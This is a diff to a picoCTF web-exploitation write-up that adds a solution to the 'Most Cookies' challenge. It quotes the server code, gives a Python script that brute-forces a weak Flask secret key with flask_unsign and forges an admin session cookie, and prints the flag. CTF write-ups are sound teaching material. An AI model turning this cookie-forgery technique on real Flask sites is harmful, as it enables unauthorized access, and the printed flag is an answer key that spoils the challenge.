@@ -27,7 +27,7 @@ Web Exploitation entails the manipulation of websites and web hosted services us
 - [Who are you? (2021)](#who-are-you) ✓
 - [Some Assembly Required 2 (2021)](#some-assembly-required-2) ✓
 - [Super Serial (2021)](#super-serial) ✓
-- [Most Cookies (2021)](#most-cookies)
+- [Most Cookies (2021)](#most-cookies) ✓
 - [Some Assembly Required 3 (2021)](#some-assembly-required-3) ✓
 - [Web Gauntlet 2 (2021)](#web-gauntlet-2)
 - [Some Assembly Required 4 (2021)](#some-assembly-required-4)
@@ -4196,6 +4196,77 @@ if __name__ == "__main__":
 
 <summary markdown="span">Solution 1</summary>
 
+Reviewing the server.py code, we can see that a ransom secret key is selected from a list of strings, each with a baked cookie name:
+
+~~~py
+cookie_names = ["snickerdoodle", "chocolate chip", "oatmeal raisin", "gingersnap", "shortbread", "peanut butter", "whoopie pie", "sugar", "molasses", "kiss", "biscotti", "butter", "spritz", "snowball", "drop", "thumbprint", "pinwheel", "wafer", "macaroon", "fortune", "crinkle", "icebox", "gingerbread", "tassie", "lebkuchen", "macaron", "black and white", "white chocolate macadamia"]
+app.secret_key = random.choice(cookie_names)
+~~~
+
+There is a function that returns the flag:
+
+~~~py
+def flag():
+	if session.get("very_auth"):
+		check = session["very_auth"]
+		if check == "admin":
+			resp = make_response(render_template("flag.html", value=flag_value, title=title))
+			return resp
+		flash("That is a cookie! Not very special though...", "success")
+		return render_template("not-flag.html", title=title, cookie_name=session["very_auth"])
+	else:
+		resp = make_response(redirect("/"))
+		session["very_auth"] = "blank"
+		return resp
+~~~
+
+This checks to see if the website cookie has a name and value {"very_auth":"admin"}. We can use [flask-unsign](https://blog.paradoxis.nl/defeating-flasks-session-management-65706ba9d3ce) in python to solve this challenge:
+
+~~~py
+import requests
+import flask_unsign as fu
+
+HUNT = "picoCTF{"
+URL1 = "http://mercury.picoctf.net:35697"
+URL2 = "http://mercury.picoctf.net:35697/display"
+
+# Retrieve cookie:
+s = requests.Session()
+s.get(URL1)
+s.close()
+COOKIE = s.cookies.get_dict()
+
+# extract data:
+C_NAME = 'session'
+C_DATA = "eyJ2ZXJ5X2F1dGgiOiJibGFuayJ9.Yc7_gQ.6Lt-JMj2LM4gJD23SepPn9YHS4A"
+
+USER = {'very_auth':'admin'}
+KEYS = ["snickerdoodle", "chocolate chip", "oatmeal raisin", "gingersnap", "shortbread", "peanut butter", "whoopie pie", "sugar", "molasses", "kiss", "biscotti", "butter", "spritz", "snowball", "drop", "thumbprint", "pinwheel", "wafer", "macaroon", "fortune", "crinkle", "icebox", "gingerbread", "tassie", "lebkuchen", "macaron", "black and white", "white chocolate macadamia"]
+
+for secret in KEYS:
+    if (fu.verify(C_DATA,secret)):
+        print(secret)
+        nc_data = fu.sign(USER,secret)
+        nc = {C_NAME:nc_data}
+        break
+
+s = requests.Session()
+r = s.get(URL2,cookies = nc)
+s.close()
+
+if HUNT not in r.text:
+    print("error - flag not found!")
+else:
+    webtext = r.text
+    start = webtext.index(HUNT)
+    webtext = webtext[start:]
+    end = webtext.index("}")
+    flag = webtext[:end+1]
+    print("Flag is {}".format(flag))
+~~~
+
+This returns the flag.
+	
 </details>
 
 ### Answer
@@ -4205,7 +4276,7 @@ if __name__ == "__main__":
 <summary markdown="span">Flag</summary>
 
 ~~~
-picoCTF{}
+picoCTF{pwn_4ll_th3_cook1E5_22fe0842}
 ~~~
 
 </details>
